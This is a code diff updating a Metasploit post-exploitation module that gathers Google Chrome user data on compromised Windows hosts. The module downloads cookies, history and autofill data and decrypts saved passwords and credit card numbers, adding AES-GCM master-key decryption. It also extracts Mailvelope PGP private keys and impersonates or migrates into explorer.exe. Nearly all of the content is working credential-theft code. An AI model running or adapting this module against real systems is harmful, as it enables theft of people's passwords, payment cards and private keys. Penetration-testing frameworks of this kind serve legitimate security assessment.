@@ -11,7 +11,7 @@ class MetasploitModule < Msf::Post
     super(
       update_info(
         info,
-        'Name' => "Windows Gather Google Chrome User Data Enumeration",
+        'Name' => 'Windows Gather Google Chrome User Data Enumeration',
         'Description' => %q{
           This module will collect user data from Google Chrome and attempt to decrypt
           sensitive information.
@@ -58,40 +58,40 @@ class MetasploitModule < Msf::Post
   end
 
   def extension_mailvelope_parse_key(data)
-    return data.gsub("\x00", "").tr("[]", "").gsub("\\r", "").gsub("\"", "").gsub("\\n", "\n")
+    return data.gsub("\x00", '').tr('[]', '').gsub('\\r', '').gsub('"', '').gsub('\\n', "\n")
   end
 
   def extension_mailvelope_store_key(name, value)
     return unless name =~ /(private|public)keys/i
 
-    priv_or_pub = $1
+    priv_or_pub = Regexp.last_match(1)
 
-    keys = value.split(",")
+    keys = value.split(',')
     print_good("==> Found #{keys.size} #{priv_or_pub} key(s)!")
     keys.each do |key|
       key_data = extension_mailvelope_parse_key(key)
       vprint_good(key_data)
       path = store_loot(
-        "chrome.mailvelope.#{priv_or_pub}", "text/plain", session, key_data, "#{priv_or_pub}.key", "Mailvelope PGP #{priv_or_pub.capitalize} Key"
+        "chrome.mailvelope.#{priv_or_pub}", 'text/plain', session, key_data, "#{priv_or_pub}.key", "Mailvelope PGP #{priv_or_pub.capitalize} Key"
       )
       print_good("==> Saving #{priv_or_pub} key to: #{path}")
     end
   end
 
   def extension_mailvelope(username, extname)
-    chrome_path = @profiles_path + "\\" + username + @data_path
+    chrome_path = @profiles_path + '\\' + username + @data_path + 'Default'
     maildb_path = chrome_path + "/Local Storage/chrome-extension_#{extname}_0.localstorage"
     if file_exist?(maildb_path) == false
-      print_error("==> Mailvelope database not found")
+      print_error('==> Mailvelope database not found')
       return
     end
-    print_status("==> Downloading Mailvelope database...")
-    local_path = store_loot("chrome.ext.mailvelope", "text/plain", session, "chrome_ext_mailvelope")
+    print_status('==> Downloading Mailvelope database...')
+    local_path = store_loot('chrome.ext.mailvelope', 'text/plain', session, 'chrome_ext_mailvelope')
     session.fs.file.download_file(local_path, maildb_path)
     print_good("==> Downloaded to #{local_path}")
 
     maildb = SQLite3::Database.new(local_path)
-    columns, *rows = maildb.execute2("select * from ItemTable;")
+    columns, *rows = maildb.execute2('select * from ItemTable;')
     maildb.close
 
     rows.each do |name, value|
@@ -106,100 +106,129 @@ class MetasploitModule < Msf::Post
     end
     results = ActiveSupport::JSON.decode(prefs)
     if results['extensions']['settings']
-      print_status("Extensions installed: ")
+      print_status('Extensions installed: ')
       results['extensions']['settings'].each do |name, values|
-        if values['manifest']
-          print_status("=> #{values['manifest']['name']}")
-          if values['manifest']['name'] =~ /mailvelope/i
-            print_good("==> Found Mailvelope extension, extracting PGP keys")
-            extension_mailvelope(username, name)
-          end
+        next unless values['manifest']
+
+        print_status("=> #{values['manifest']['name']}")
+        if values['manifest']['name'] =~ /mailvelope/i
+          print_good('==> Found Mailvelope extension, extracting PGP keys')
+          extension_mailvelope(username, name)
         end
       end
     end
   end
 
+  def get_master_key(local_state_path)
+    local_state_data = read_file(local_state_path)
+    local_state = JSON.parse(local_state_data)
+    master_key_base64 = local_state['os_crypt']['encrypted_key']
+    master_key = Rex::Text.decode_base64(master_key_base64)
+    master_key
+  end
+
   def decrypt_data(data)
-    pid = session.sys.process.open.pid
-    process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
+    memsize = 1024 * ((data.length + 1023) / 1024)
+    mem_alloc = session.railgun.kernel32.LocalAlloc(0, data.length)
+    mem = mem_alloc['return']
+    session.railgun.memwrite(mem, data, data.length)
 
-    mem = process.memory.allocate(1024)
-    process.memory.write(mem, data)
-
-    if session.sys.process.each_process.find { |i| i["pid"] == pid } ["arch"] == "x86"
-
-      addr = [mem].pack("V")
-      len = [data.length].pack("V")
-      ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
-      len, addr = ret["pDataOut"].unpack("V2")
-
+    if session.arch == 'x86'
+      addr = [mem].pack('V')
+      len = [data.length].pack('V')
+      pdatain = "#{len}#{addr}".force_encoding('ascii')
+      ret = session.railgun.crypt32.CryptUnprotectData(pdatain, 16, nil, nil, nil, 0, 8)
+      len, addr = ret['pDataOut'].unpack('V2')
     else
-
-      addr = [mem].pack("Q")
-      len = [data.length].pack("Q")
-      ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
-      len, addr = ret["pDataOut"].unpack("Q2")
-
+      addr = [mem].pack('Q')
+      len = [data.length].pack('Q')
+      pdatain = "#{len}#{addr}".force_encoding('ascii')
+      ret = session.railgun.crypt32.CryptUnprotectData(pdatain, 16, nil, nil, nil, 0, 16)
+      len, addr = ret['pDataOut'].unpack('Q2')
     end
 
-    return "" if len == 0
+    return nil if len == 0
 
-    decrypted = process.memory.read(addr, len)
+    decrypted = session.railgun.memread(addr, len)
+
+    session.railgun.kernel32.LocalFree(mem)
+    session.railgun.kernel32.LocalFree(addr)
+
     return decrypted
   end
 
   def process_files(username)
-    secrets = ""
+    secrets = ''
+    masterkey = nil
     decrypt_table = Rex::Text::Table.new(
-      "Header" => "Decrypted data",
-      "Indent" => 1,
-      "Columns" => ["Name", "Decrypted Data", "Origin"]
+      'Header' => 'Decrypted data',
+      'Indent' => 1,
+      'Columns' => ['Name', 'Decrypted Data', 'Origin']
     )
 
     @chrome_files.each do |item|
-      if item[:in_file] == "Preferences"
+      if item[:in_file] == 'Preferences'
         parse_prefs(username, item[:raw_file])
       end
 
-      next if item[:sql] == nil
-      next if item[:raw_file] == nil
+      next if item[:sql].nil?
+      next if item[:raw_file].nil?
 
       db = SQLite3::Database.new(item[:raw_file])
       begin
         columns, *rows = db.execute2(item[:sql])
-      rescue
+      rescue StandardError
         next
       end
       db.close
 
       rows.map! do |row|
         res = Hash[*columns.zip(row).flatten]
-        if item[:encrypted_fields] && !session.sys.config.is_system?
+        next unless item[:encrypted_fields] && !session.sys.config.is_system?
 
-          item[:encrypted_fields].each do |field|
-            name = (res["name_on_card"] == nil) ? res["username_value"] : res["name_on_card"]
-            origin = (res["label"] == nil) ? res["origin_url"] : res["label"]
-            pass = res[field + "_decrypted"] = decrypt_data(res[field])
-            if pass != nil and pass != ""
-              decrypt_table << [name, pass, origin]
-              secret = "#{name}:#{pass}..... #{origin}"
-              secrets << secret << "\n"
-              vprint_good("Decrypted data: #{secret}")
+        item[:encrypted_fields].each do |field|
+          name = res['name_on_card'].nil? ? res['username_value'] : res['name_on_card']
+          origin = res['label'].nil? ? res['origin_url'] : res['label']
+          enc_data = res[field]
+
+          if enc_data.start_with? 'v10'
+            unless masterkey
+              print_status('Found password encrypted with masterkey')
+              local_state_path = @profiles_path + '\\' + username + @data_path + 'Local State'
+              masterkey_encrypted = get_master_key(local_state_path)
+              masterkey = decrypt_data(masterkey_encrypted[5..-1])
+              print_good('Found masterkey!')
             end
+
+            cipher = OpenSSL::Cipher.new('aes-256-gcm')
+            cipher.decrypt
+            cipher.key = masterkey
+            cipher.iv = enc_data[3..14]
+            ciphertext = enc_data[15..-17]
+            cipher.auth_tag = enc_data[-16..-1]
+            pass = res[field + '_decrypted'] = cipher.update(ciphertext) + cipher.final
+          else
+            pass = res[field + '_decrypted'] = decrypt_data(enc_data)
           end
+          next unless !pass.nil? and pass != ''
+
+          decrypt_table << [name, pass, origin]
+          secret = "url:#{origin} #{name}:#{pass}"
+          secrets << secret << "\n"
+          vprint_good("Decrypted data: #{secret}")
         end
       end
     end
 
-    if secrets != ""
-      path = store_loot("chrome.decrypted", "text/plain", session, decrypt_table.to_s, "decrypted_chrome_data.txt", "Decrypted Chrome Data")
+    if secrets != ''
+      path = store_loot('chrome.decrypted', 'text/plain', session, decrypt_table.to_s, 'decrypted_chrome_data.txt', 'Decrypted Chrome Data')
       print_good("Decrypted data saved in: #{path}")
     end
   end
 
   def extract_data(username)
     # Prepare Chrome's path on remote machine
-    chrome_path = @profiles_path + "\\" + username + @data_path
+    chrome_path = @profiles_path + '\\' + username + @data_path + 'Default'
     raw_files = {}
 
     @chrome_files.map { |e| e[:in_file] }.uniq.each do |f|
@@ -212,7 +241,7 @@ class MetasploitModule < Msf::Post
       end
 
       # Store raw data
-      local_path = store_loot("chrome.raw.#{f}", "text/plain", session, "chrome_raw_#{f}")
+      local_path = store_loot("chrome.raw.#{f}", 'text/plain', session, "chrome_raw_#{f}")
       raw_files[f] = local_path
       session.fs.file.download_file(local_path, remote_path)
       print_good("Downloaded #{f} to '#{local_path}'")
@@ -232,11 +261,11 @@ class MetasploitModule < Msf::Post
 
   def steal_token
     current_pid = session.sys.process.open.pid
-    target_pid = session.sys.process["explorer.exe"]
+    target_pid = session.sys.process['explorer.exe']
     return if target_pid == current_pid
 
     if target_pid.to_s.empty?
-      print_warning("No explorer.exe process to impersonate.")
+      print_warning('No explorer.exe process to impersonate.')
       return
     end
 
@@ -245,14 +274,14 @@ class MetasploitModule < Msf::Post
       session.sys.config.steal_token(target_pid)
       return true
     rescue Rex::Post::Meterpreter::RequestError => e
-      print_error("Cannot impersonate: #{e.message.to_s}")
+      print_error("Cannot impersonate: #{e.message}")
       return false
     end
   end
 
   def migrate(pid = nil)
     current_pid = session.sys.process.open.pid
-    if pid != nil and current_pid != pid
+    if !pid.nil? and current_pid != pid
       # PID is specified
       target_pid = pid
       print_status("current PID is #{current_pid}. Migrating to pid #{target_pid}")
@@ -264,7 +293,7 @@ class MetasploitModule < Msf::Post
       end
     else
       # No PID specified, assuming to migrate to explorer.exe
-      target_pid = session.sys.process["explorer.exe"]
+      target_pid = session.sys.process['explorer.exe']
       if target_pid != current_pid
         @old_pid = current_pid
         print_status("current PID is #{current_pid}. migrating into explorer.exe, PID=#{target_pid}...")
@@ -281,17 +310,17 @@ class MetasploitModule < Msf::Post
 
   def run
     @chrome_files = [
-      { :raw => "", :in_file => "Web Data", :sql => "select * from autofill;" },
-      { :raw => "", :in_file => "Web Data", :sql => "SELECT username_value,origin_url,signon_realm FROM logins;" },
-      { :raw => "", :in_file => "Web Data", :sql => "select * from autofill_profiles;" },
-      { :raw => "", :in_file => "Web Data", :sql => "select * from credit_cards;", :encrypted_fields => ["card_number_encrypted"] },
-      { :raw => "", :in_file => "Cookies", :sql => "select * from cookies;" },
-      { :raw => "", :in_file => "History", :sql => "select * from urls;" },
-      { :raw => "", :in_file => "History", :sql => "SELECT url FROM downloads;" },
-      { :raw => "", :in_file => "History", :sql => "SELECT term FROM keyword_search_terms;" },
-      { :raw => "", :in_file => "Login Data", :sql => "select * from logins;", :encrypted_fields => ["password_value"] },
-      { :raw => "", :in_file => "Bookmarks", :sql => nil },
-      { :raw => "", :in_file => "Preferences", :sql => nil },
+      { raw: '', in_file: 'Web Data', sql: 'select * from autofill;' },
+      { raw: '', in_file: 'Web Data', sql: 'SELECT username_value,origin_url,signon_realm FROM logins;' },
+      { raw: '', in_file: 'Web Data', sql: 'select * from autofill_profiles;' },
+      { raw: '', in_file: 'Web Data', sql: 'select * from credit_cards;', encrypted_fields: ['card_number_encrypted'] },
+      { raw: '', in_file: 'Cookies', sql: 'select * from cookies;' },
+      { raw: '', in_file: 'History', sql: 'select * from urls;' },
+      { raw: '', in_file: 'History', sql: 'SELECT url FROM downloads;' },
+      { raw: '', in_file: 'History', sql: 'SELECT term FROM keyword_search_terms;' },
+      { raw: '', in_file: 'Login Data', sql: 'select * from logins;', encrypted_fields: ['password_value'] },
+      { raw: '', in_file: 'Bookmarks', sql: nil },
+      { raw: '', in_file: 'Preferences', sql: nil },
     ]
 
     @old_pid = nil
@@ -300,7 +329,7 @@ class MetasploitModule < Msf::Post
     # If we can impersonate a token, we use that first.
     # If we can't, we'll try to MIGRATE (more aggressive) if the user wants to
     got_token = steal_token
-    if !got_token && datastore["MIGRATE"]
+    if !got_token && datastore['MIGRATE']
       migrate_success = migrate
     end
 
@@ -311,25 +340,25 @@ class MetasploitModule < Msf::Post
     sysdrive = env_vars['SYSTEMDRIVE'].strip
     if directory?("#{sysdrive}\\Users")
       @profiles_path = "#{sysdrive}/Users"
-      @data_path = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
+      @data_path = '\\AppData\\Local\\Google\\Chrome\\User Data\\'
     elsif directory?("#{sysdrive}\\Documents and Settings")
       @profiles_path = "#{sysdrive}/Documents and Settings"
-      @data_path = "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default"
+      @data_path = '\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\'
     end
 
     # Get user(s)
     usernames = []
     if is_system?
-      print_status("Running as SYSTEM, extracting user list...")
-      print_warning("(Automatic decryption will not be possible. You might want to manually migrate, or set \"MIGRATE=true\")")
+      print_status('Running as SYSTEM, extracting user list...')
+      print_warning('(Automatic decryption will not be possible. You might want to manually migrate, or set "MIGRATE=true")')
       session.fs.dir.foreach(@profiles_path) do |u|
         not_actually_users = [
-          ".", "..", "All Users", "Default", "Default User", "Public", "desktop.ini",
-          "LocalService", "NetworkService"
+          '.', '..', 'All Users', 'Default', 'Default User', 'Public', 'desktop.ini',
+          'LocalService', 'NetworkService'
         ]
         usernames << u unless not_actually_users.include?(u)
       end
-      print_status "Users found: #{usernames.join(", ")}"
+      print_status "Users found: #{usernames.join(', ')}"
     else
       uid = session.sys.config.getuid
       print_status "Running as user '#{uid}'..."
@@ -340,7 +369,7 @@ class MetasploitModule < Msf::Post
     begin
       require 'sqlite3'
     rescue LoadError
-      print_warning("SQLite3 is not available, and we are not able to parse the database.")
+      print_warning('SQLite3 is not available, and we are not able to parse the database.')
       has_sqlite3 = false
     end
 
@@ -352,8 +381,8 @@ class MetasploitModule < Msf::Post
     end
 
     # Migrate back to the original process
-    if datastore["MIGRATE"] && @old_pid && migrate_success
-      print_status("Migrating back...")
+    if datastore['MIGRATE'] && @old_pid && migrate_success
+      print_status('Migrating back...')
       migrate(@old_pid)
     end
   end
